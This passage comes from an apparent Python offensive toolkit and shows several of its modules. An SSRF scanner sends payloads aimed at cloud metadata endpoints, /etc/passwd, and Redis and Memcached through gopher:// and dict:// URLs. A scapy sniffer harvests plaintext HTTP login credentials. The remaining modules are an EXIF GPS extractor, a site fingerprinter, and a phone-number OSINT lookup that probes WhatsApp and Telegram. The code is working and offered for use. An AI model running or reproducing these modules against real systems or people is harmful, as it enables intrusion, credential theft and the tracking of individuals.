        "http://100.100.100.200/latest/meta-data/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        "dict://127.0.0.1:11211/stats",
    ]

    def test(self, url, param):
        print(f"\n{SC}[*] Testing SSRF on {url} (param: {param}){SR}\n")
        indicators_leak = ["root:x:", "daemon:", "[fonts]", "ami-id", "instance-id", "computeMetadata", "SSH-", "# Redis"]

        for i, target in enumerate(self.INTERNAL_TARGETS):
            progress_bar(i + 1, len(self.INTERNAL_TARGETS), prefix=f"{SC}Testing SSRF{SR}")
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(target)}"
                r = requests.get(test_url, timeout=6, verify=False,
                               headers={"User-Agent": random_ua()})
                body = r.text

                if any(ind in body for ind in indicators_leak):
                    print(f"\n    {R}[!] SSRF CONFIRMED: {target}{SR}")
                    print(f"    {SY}Status: {r.status_code} | Size: {len(body)} bytes{SR}")
                elif r.status_code == 200 and len(body) > 100 and "error" not in body.lower()[:200]:
                    print(f"\n    {SY}[?] Possible SSRF: {target} (status 200, {len(body)}B){SR}")
            except requests.exceptions.Timeout:
                print(f"\n    {SY}[?] Timeout on {target} (may indicate internal scan){SR}")
            except:
                pass
        print()

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("SSRF SCANNER", color=R)
        print(f"\n{SY}[!] Tests for Server-Side Request Forgery on URL parameters{SR}\n")

        url = input(f"{SG}[+] Target URL (e.g., http://site.com/fetch?url=): {SR}")
        param = input(f"{SG}[+] Vulnerable param name (Enter=url): {SR}") or "url"
        self.test(url, param)
        pause()

class PacketSniffer:
    def __init__(self):
        self.name = "PACKET SNIFFER"

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("PACKET SNIFFER", color=SC)
        print(f"\n{SY}[!] Requires root on Linux (raw sockets){SR}\n")

        try:
            from scapy.all import sniff, IP, TCP, UDP, Raw, DNS
        except ImportError:
            print(f"{SY}[!] Installing scapy...{SR}")
            _pip_install("scapy")
            from scapy.all import sniff, IP, TCP, UDP, Raw, DNS

        print(f"{SY}[!] Sniffer Modes:{SR}")
        print(f"  {SC}[1]{SR} Capture HTTP credentials (passwords in plain text)")
        print(f"  {SC}[2]{SR} Capture DNS queries")
        print(f"  {SC}[3]{SR} General packet capture")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        count = int(input(f"{SG}[+] Packet count (Enter=50): {SR}") or "50")
        iface = input(f"{SG}[+] Interface (Enter=default): {SR}") or None

        if choice == "1":
            print(f"\n{SG}[+] Listening for HTTP POST credentials on port 80...{SR}")
            def http_cb(pkt):
                if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80:
                    payload = pkt[Raw].load.decode(errors='ignore')
                    if any(k in payload.lower() for k in ["password=", "pass=", "pwd=", "login=", "user="]):
                        src = pkt[IP].src if pkt.haslayer(IP) else "?"
                        print(f"\n    {R}[!] CREDENTIALS from {src}:{SR}")
                        creds = re.findall(r'(password|pass|pwd|user|login|email)=([^&\s]+)', payload, re.IGNORECASE)
                        for k, v in creds:
                            print(f"    {SG}    {k} = {unquote(v)}{SR}")
            sniff(filter="tcp port 80", prn=http_cb, count=count, iface=iface, store=0)

        elif choice == "2":
            print(f"\n{SG}[+] Capturing DNS queries...{SR}")
            def dns_cb(pkt):
                if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                    qname = pkt[DNS].qd.qname.decode() if pkt[DNS].qd else "?"
                    src = pkt[IP].src if pkt.haslayer(IP) else "?"
                    print(f"    {SC}[{src}] -> {qname}{SR}")
            sniff(filter="udp port 53", prn=dns_cb, count=count, iface=iface, store=0)

        elif choice == "3":
            print(f"\n{SG}[+] General capture ({count} packets)...{SR}")
            def pkt_cb(pkt):
                if pkt.haslayer(IP):
                    proto = "TCP" if pkt.haslayer(TCP) else "UDP" if pkt.haslayer(UDP) else "OTHER"
                    print(f"    {SY}[{proto}] {pkt[IP].src} -> {pkt[IP].dst} ({len(pkt)}B){SR}")
            sniff(count=count, prn=pkt_cb, iface=iface, store=0)

        print(f"\n{SG}[+] Capture finished.{SR}")
        pause()

class ImageMetadata:
    def __init__(self):
        self.name = "IMAGE METADATA EXTRACTOR"

    def _to_degrees(self, value):
        d, m, s = float(value[0]), float(value[1]), float(value[2])
        return d + m / 60.0 + s / 3600.0

    def extract(self, path):
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS, GPSTAGS
        except ImportError:
            status("Installing Pillow...", "warn")
            _pip_install("Pillow")
            from PIL import Image
            from PIL.ExifTags import TAGS, GPSTAGS

        if not os.path.exists(path):
            status("File not found", "err")
            return
        if not path.lower().endswith((".jpg", ".jpeg", ".png", ".tiff", ".bmp", ".webp")):
            status("Unsupported format (use JPG/PNG/TIFF/BMP/WebP)", "err")
            return

        try:
            img = Image.open(path)
            exif = img._getexif()
        except Exception as e:
            status(f"Error: {e}", "err")
            return

        print(f"\n{SC}[*] Metadata for: {os.path.basename(path)}{SR}")
        divider(color=SC)

        st = os.stat(path)
        status(f"Size: {st.st_size} bytes", "info")
        status(f"Modified: {time.ctime(st.st_mtime)}", "info")

        try:
            status(f"Dimensions: {img.size[0]}x{img.size[1]} ({img.format}, {img.mode})", "info")
        except Exception:
            pass

        if not exif:
            status("No EXIF metadata found", "warn")
            return

        gps_info = None
        print(f"\n{SY}[+] EXIF data:{SR}")
        for tag_id, value in exif.items():
            tag = TAGS.get(tag_id, tag_id)
            if tag == "GPSInfo":
                gps_info = {GPSTAGS.get(k, k): v for k, v in value.items()}
                continue
            val = str(value)
            if len(val) > 80:
                val = val[:80] + "..."
            print(f"  {SG}{tag}:{SR} {W}{val}{SR}")

        if gps_info:
            print(f"\n{SY}[+] GPS coordinates:{SR}")
            try:
                lat = self._to_degrees(gps_info["GPSLatitude"])
                if gps_info.get("GPSLatitudeRef") != "N":
                    lat = -lat
                lon = self._to_degrees(gps_info["GPSLongitude"])
                if gps_info.get("GPSLongitudeRef") != "E":
                    lon = -lon
                print(f"  {SG}Latitude:{SR}  {W}{lat}{SR}")
                print(f"  {SG}Longitude:{SR} {W}{lon}{SR}")
                print(f"  {SC}Google Maps:{SR} {W}https://www.google.com/maps?q={lat},{lon}{SR}")
            except Exception as e:
                status(f"GPS parse error: {e}", "err")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("IMAGE METADATA EXTRACTOR", color=SM)
        print(f"\n{SY}[!] Extracts EXIF data including GPS coordinates from photos{SR}\n")
        path = input(f"{SG}[+] Image path: {SR}").strip().strip('"').strip("'")
        self.extract(path)
        pause()

class TechIntAnalyzer:
    def __init__(self):
        self.name = "TECHINT ANALYZER"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random_ua()})

    def analyze(self, url):
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        print(f"\n{SC}[*] Analyzing {url}{SR}")

        with Spinner("Fetching target", color=SC):
            try:
                r = self.session.get(url, timeout=10, verify=False, allow_redirects=True)
            except Exception as e:
                status(f"Connection error: {e}", "err")
                return

        status(f"HTTP {r.status_code}  |  Final URL: {r.url}", "ok")

        server = r.headers.get("Server", "Not disclosed")
        powered = r.headers.get("X-Powered-By", "Not disclosed")
        print(f"\n{SY}[+] Server:{SR}")
        status(f"Server header: {server}", "info")
        status(f"X-Powered-By:  {powered}", "info")

        sec = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking",
            "X-Content-Type-Options": "MIME-sniff",
            "Referrer-Policy": "Referrer",
            "Permissions-Policy": "Permissions",
        }
        print(f"\n{SY}[+] Security headers:{SR}")
        for h, label in sec.items():
            if h in r.headers:
                status(f"{label}: {r.headers[h][:60]}", "ok")
            else:
                status(f"{label}: MISSING", "warn")

        print(f"\n{SY}[+] Cookies:{SR}")
        if not r.cookies:
            status("No cookies set", "info")
        for c in r.cookies:
            flags = []
            if c.secure: flags.append("Secure")
            if c.has_nonstandard_attr("HttpOnly"): flags.append("HttpOnly")
            status(f"{c.name} [{', '.join(flags) or 'no flags'}]", "info")

        html = r.text
        print(f"\n{SY}[+] Metadata:{SR}")
        patterns = {
            "Title":       r"<title>([^<]+)</title>",
            "Generator":   r'<meta\s+name=["\']generator["\']\s+content=["\']([^"\']+)["\']',
            "Author":      r'<meta\s+name=["\']author["\']\s+content=["\']([^"\']+)["\']',
            "Description": r'<meta\s+name=["\']description["\']\s+content=["\']([^"\']+)["\']',
        }
        found_any = False
        for label, pat in patterns.items():
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                status(f"{label}: {m.group(1).strip()[:100]}", "ok")
                found_any = True
        if not found_any:
            status("No metadata found", "warn")

        print(f"\n{SY}[+] Detected technologies:{SR}")
        techs = {
            "WordPress":  [r"wp-content", r"wp-includes"],
            "Drupal":     [r"Drupal", r"/sites/default/"],
            "Joomla":     [r"/components/com_", r"Joomla"],
            "Django":     [r"csrfmiddlewaretoken"],
            "Laravel":    [r"laravel_session", r"XSRF-TOKEN"],
            "React":      [r"data-reactroot", r"_next/static"],
            "Vue.js":     [r"vue\.js", r"data-v-"],
            "Angular":    [r"ng-version", r"ng-app"],
            "Bootstrap":  [r"bootstrap[.-](min\.)?css"],
            "jQuery":     [r"jquery[.-]\d", r"jquery\.min\.js"],
            "Cloudflare": [r"__cf_bm", r"cloudflare"],
            "Nginx":      [r"nginx"],
            "PHP":        [r"\.php\?", r"PHPSESSID"],
        }
        detected = []
        for tech, pats in techs.items():
            for p in pats:
                if re.search(p, html + str(r.headers), re.IGNORECASE):
                    detected.append(tech)
                    break
        for t in detected:
            status(t, "ok")
        if not detected:
            status("No technology fingerprints detected", "warn")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("TECHINT ANALYZER", color=SC)
        print(f"\n{SY}[!] Tech stack + security headers + metadata{SR}\n")
        url = input(f"{SG}[+] Target URL: {SR}").strip()
        requests.packages.urllib3.disable_warnings()
        self.analyze(url)
        pause()

class PhoneLookup:
    COUNTRY_CODES = {
        "+33": "France", "+44": "United Kingdom", "+1": "USA/Canada",
        "+61": "Australia", "+49": "Germany", "+34": "Spain", "+39": "Italy",
        "+91": "India", "+86": "China", "+81": "Japan", "+82": "South Korea",
        "+7": "Russia", "+55": "Brazil", "+52": "Mexico", "+27": "South Africa",
        "+971": "UAE", "+966": "Saudi Arabia", "+31": "Netherlands", "+32": "Belgium",
        "+41": "Switzerland", "+46": "Sweden", "+47": "Norway", "+45": "Denmark",
        "+48": "Poland", "+351": "Portugal", "+30": "Greece", "+90": "Turkey",
        "+212": "Morocco", "+213": "Algeria", "+216": "Tunisia",
    }

    def __init__(self):
        self.name = "PHONE LOOKUP"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random_ua()})

    def detect_country(self, phone):
        for code in sorted(self.COUNTRY_CODES, key=len, reverse=True):
            if phone.startswith(code):
                return code, self.COUNTRY_CODES[code]
        return None, None

    def clean(self, phone):
        phone = re.sub(r"[^\d+]", "", phone)
        if not phone.startswith("+"):
            if phone.startswith("0") and len(phone) == 10:
                phone = "+33" + phone[1:]
            elif phone.startswith("33"):
                phone = "+" + phone
            else:
                phone = "+" + phone
        return phone

    def check_whatsapp(self, phone):
        clean = phone.replace("+", "")
        try:
            r = self.session.head(f"https://api.whatsapp.com/send?phone={clean}",
                                  timeout=8, allow_redirects=False)
            if r.status_code in (200, 301, 302):
                return f"https://wa.me/{clean}"
        except Exception:
            pass
        return None

    def check_telegram(self, phone):
        clean = phone.replace("+", "")
        try:
            r = self.session.get(f"https://t.me/{clean}", timeout=8)
            if "tgme_page" in r.text:
                return f"https://t.me/{clean}"
        except Exception:
            pass
        return None

    def lookup(self, phone):
        phone = self.clean(phone)
        print(f"\n{SC}[*] Cleaned number: {phone}{SR}")

        code, country = self.detect_country(phone)
        if code:
            status(f"Country: {country} ({code})", "ok")
        else:
            status("Unknown country code", "warn")

        try:
            import phonenumbers
            from phonenumbers import geocoder, carrier, timezone as tz
            parsed = phonenumbers.parse(phone)
            if phonenumbers.is_valid_number(parsed):
                status(f"Valid number ({phonenumbers.number_type(parsed)})", "ok")
                loc = geocoder.description_for_number(parsed, "en")
                if loc:
                    status(f"Region: {loc}", "info")
                car = carrier.name_for_number(parsed, "en")
                if car:
                    status(f"Carrier: {car}", "info")
                tzs = tz.time_zones_for_number(parsed)
                if tzs:
                    status(f"Timezones: {', '.join(tzs)}", "info")
            else:
                status("Number format invalid", "warn")
        except ImportError:
            status("Installing phonenumbers for deeper lookup...", "warn")
            _pip_install("phonenumbers")
            status("Relaunch the module to use phonenumbers features", "info")
        except Exception as e:
            status(f"phonenumbers error: {e}", "warn")

        print(f"\n{SY}[+] Messaging apps presence:{SR}")
        wa = self.check_whatsapp(phone)
        if wa:
            status(f"WhatsApp: {wa}", "ok")
        else:
            status("WhatsApp: not found / private", "warn")

        tg = self.check_telegram(phone)
        if tg:
            status(f"Telegram: {tg}", "ok")
        else:
            status("Telegram: not found", "warn")

        print(f"\n{SY}[+] OSINT search URLs (open in browser):{SR}")
        q = quote(phone)
        for label, url in [
            ("Google",     f"https://www.google.com/search?q={q}"),
            ("Facebook",   f"https://www.google.com/search?q=site:facebook.com+{q}"),
            ("Instagram",  f"https://www.google.com/search?q=site:instagram.com+{q}"),
            ("LinkedIn",   f"https://www.google.com/search?q=site:linkedin.com+{q}"),
            ("Truecaller", f"https://www.truecaller.com/search/fr/{q}"),
        ]:
            print(f"  {SC}→ {label}:{SR} {W}{url}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("PHONE LOOKUP", color=SB)
        print(f"\n{SY}[!] Phone intelligence: country, carrier, messaging apps{SR}\n")
        phone = input(f"{SG}[+] Phone number (+33... or 06...): {SR}").strip()
        self.lookup(phone)
        pause()

if __name__ == "__main__":
    check_dependencies()
    show_disclaimer()
    os.system('cls' if os.name == 'nt' else 'clear')
    typing(f"{SG}[+] ALL MODULES LOADED SUCCESSFULLY{SR}", 0.012)
    typing(f"{SG}[+] TOOLKIT v5.0 READY - 33 MODULES AVAILABLE{SR}", 0.012)
    time.sleep(0.5)
    main_menu()
